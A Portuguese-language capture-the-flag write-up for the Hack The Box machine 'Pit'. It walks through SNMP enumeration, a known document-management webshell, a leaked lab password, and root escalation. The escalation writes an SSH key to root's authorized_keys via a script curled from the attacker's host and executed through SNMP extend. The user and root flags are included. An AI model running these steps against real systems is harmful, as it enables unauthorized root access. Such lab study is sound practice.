# Pit

---

## Enum

---

```python
nmap -T4 -p- -A 10.10.10.241
```

![Pit%20526625379b16485892d408838667e755/mclovin.png](Pit%20526625379b16485892d408838667e755/mclovin.png)

- Fazendo a resolução de DNS:

```python
echo "10.10.10.241 pit.htb dms-pit.htb" > /etc/hosts
```

- Agora já sabemos que existem 2 portas udp rodando SNMP:

    ![Pit%20526625379b16485892d408838667e755/Untitled.png](Pit%20526625379b16485892d408838667e755/Untitled.png)

    - Procuramos na internet scripts no github que exploram os datas do SNMP:

    [https://github.com/dheiland-r7/snmp](https://github.com/dheiland-r7/snmp)

    ```python
    perl snmpbw.pl pit.htb public 2 1
    ```

---

### Exploration

---

- Entrando podemos enviar um arquivo pra dentro da máquina:
    - Dentro do sistema vai estar exposto a versão do software: 5.1.10, que tem uma webshell pra exploração da falha!
- Procurando pela webshell no `searchsploit`

![Pit%20526625379b16485892d408838667e755/backdoor.png](Pit%20526625379b16485892d408838667e755/backdoor.png)

Rodando esses passos e explorando os diretórios descobrimos que existe um arquivo chamado:

../../../conf/settings.xml

- Dentro deste arquivo podemos encontrar uma página em branco porém com informações na sua source page:

    ![Pit%20526625379b16485892d408838667e755/burp.png](Pit%20526625379b16485892d408838667e755/burp.png)

    - Senha login → michelle: ied^ieY6xoquu

Agora voltando para `http://pit.htb:9090`

Colocando essas credenciais conseguimos encontrar um painel de login:

![Pit%20526625379b16485892d408838667e755/login-sistema.png](Pit%20526625379b16485892d408838667e755/login-sistema.png)

![Pit%20526625379b16485892d408838667e755/reverse.png](Pit%20526625379b16485892d408838667e755/reverse.png)

User Flag: be77b070e8e1ac7ac499d1412670d215

---

cd /usr/local/monitoring

- Precisamos agora criar uma RSA_Id

```python
ssh-keygen
// colocamos um nome
```

- Criamos um arquivo `[keytosend.sh](http://keytosend.sh)` que terá dentro :

```python
echo "RSA_ID_PUB" > /root/.ssh/authorized_keys
```

- Agora abrimos um servidor em python dentro da pasta na nossa máquina:

```python
python -m SimpleHTTPServer PORT
```

- E rodamos um curl dentro da máquina da vitima:

```python
curl [http://10.10.14.33](http://10.10.14.33):PORT/[keytosend.sh](http://keytosend.sh) -o check.sh 
```

- Precisamos garantir que está no /usr/local/monitoring
    - Ou então dar um :

    ```python
    cp check.sh /usr/local/monitoring 
    ```

![Pit%20526625379b16485892d408838667e755/curl.png](Pit%20526625379b16485892d408838667e755/curl.png)

- Para que esse arquivo seja rodado na máquina precisamos rodar :

```python
snmpwalk -v 1 -c public pit.htb 1.3.6.1.4.1.8072.1.3.2.2.1.2 
```

![Pit%20526625379b16485892d408838667e755/snmpwalk.png](Pit%20526625379b16485892d408838667e755/snmpwalk.png)

- ou então :

```python
snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects 
```

![Pit%20526625379b16485892d408838667e755/snmpwalk2.png](Pit%20526625379b16485892d408838667e755/snmpwalk2.png)

- Por fim

```python
ssh -i id_rsa root@pit.htb
```

Root Flag: f35dad39922ce883a572c057f672bbd8

---